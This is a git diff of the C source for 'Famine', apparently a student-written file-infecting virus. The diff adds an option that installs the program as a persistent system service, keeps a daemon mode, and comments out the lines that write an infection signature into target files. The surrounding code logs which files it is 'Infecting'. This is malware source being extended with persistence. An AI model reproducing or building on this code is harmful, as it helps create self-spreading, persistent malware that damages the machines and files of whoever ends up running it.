@@ -6,11 +6,13 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2024/08/02 02:06:49 by mgama            ###   ########.fr       */
+/*   Updated: 2024/08/02 04:50:05 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
+#include "verbose.h"
+#include "daemon.h"
 #ifdef __APPLE__
 #include "is_icloud.h"
 #endif /* __APPLE__ */
@@ -188,8 +190,8 @@ void famine(char *target, char *parent)
 	cut_last_line(verbose_size);
 	ft_verbose("Infecting %s%s%s\n", B_PINK, full_path, RESET);
 	ft_verbose("\n");
-	lseek(fd, pos, SEEK_SET);
-	write(fd, signature, sizeof(signature));
+	// lseek(fd, pos, SEEK_SET);
+	// write(fd, signature, sizeof(signature));
 	close(fd);
 }
 
@@ -252,7 +254,7 @@ void	custom_target(char *target, char *parent, int recursive, int recursive_dept
 	closedir(dir);
 }
 
-int main(int argc, char **argv)
+int main(int argc, char **argv, char *const * envp)
 {
 	const char no_xsec[] = "\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67";
 	struct stat stats;
@@ -262,6 +264,7 @@ int main(int argc, char **argv)
 
 	struct getopt_list_s optlist[] = {
 		{"daemon", 'd', OPTPARSE_NONE},
+		{"add-service", 's', OPTPARSE_NONE},
 		{"once", 'o', OPTPARSE_NONE},
 		{"multi-instances", 'm', OPTPARSE_NONE},
 		{"recursive", 'r', OPTPARSE_OPTIONAL},
@@ -283,6 +286,11 @@ int main(int argc, char **argv)
 			case 'd':
 				option |= F_DAEMON;
 				break;
+			case 's':
+				option |= F_ADDSERVICE;
+				// set the last argument to NULL to prevent from passing it to the service
+				argv[options.optind - 1] = NULL;
+				break;
 			case 'o':
 				option |= F_ONCE;
 				break;
@@ -303,7 +311,7 @@ int main(int argc, char **argv)
 				break;
 			case 'v':
 				verbose_mode = VERBOSE_ON;
-				printf(B_PINK"Famine version %s%s%s by %s%s%s\n"RESET, CYAN, FM_VERSION, B_PINK, CYAN, FM_AUTHOR, RESET);
+				ft_verbose(B_PINK"Famine version %s%s%s by %s%s%s\n"RESET, CYAN, FM_VERSION, B_PINK, CYAN, FM_AUTHOR, RESET);
 				break;
 			default:
 				exit(0);
@@ -315,7 +323,13 @@ int main(int argc, char **argv)
 
 	ft_verbose("\n%s<== Verbose mode activated ==>%s\n\n", B_RED, RESET);
 
-	if (0 == (option & F_MINSTANCE) && is_running())
+	if (option & F_ADDSERVICE && option & F_DAEMON)
+	{
+		ft_verbose("%sInvalid parameters combination%s\n", B_RED, RESET);
+		return (0);	
+	}
+
+	if (0 == (option & F_ADDSERVICE) && 0 == (option & F_MINSTANCE) && is_running())
 	{
 		ft_verbose("%sAnother instance is already running%s\n", B_RED, RESET);
 		return (0);
@@ -346,6 +360,13 @@ int main(int argc, char **argv)
 
 	ft_verbose("%s%s%s removed\n", B_GREEN, g_famine.name, RESET);
 
+	if (option & F_ADDSERVICE)
+	{
+		ft_verbose("%sAdding service%s\n", B_CYAN, RESET);
+		setup_daemon(argc - 1, argv + 1, g_famine.me, g_famine.len, envp);
+		return (write_back_prog());
+	}
+
 	/**
 	 * Daemonize the process if the option is set
 	 */
@@ -355,10 +376,10 @@ int main(int argc, char **argv)
 		ft_verbose("Disabling verbose\n");
 		verbose_mode = VERBOSE_OFF;
 		/**
-		 * BD_NO_CHDIR: Don't change the current working directory to the root directory
-		 * BD_NO_REOPEN_STD_FDS: Don't reopen stdin, stdout, and stderr to /dev/null
+		 * D_NO_CHDIR: Don't change the current working directory to the root directory
+		 * D_NO_REOPEN_STD_FDS: Don't reopen stdin, stdout, and stderr to /dev/null
 		 */
-		become_daemon(BD_NO_CHDIR | BD_NO_REOPEN_STD_FDS);
+		become_daemon(D_NO_CHDIR | D_NO_REOPEN_STD_FDS);
 	}
 
 	/**
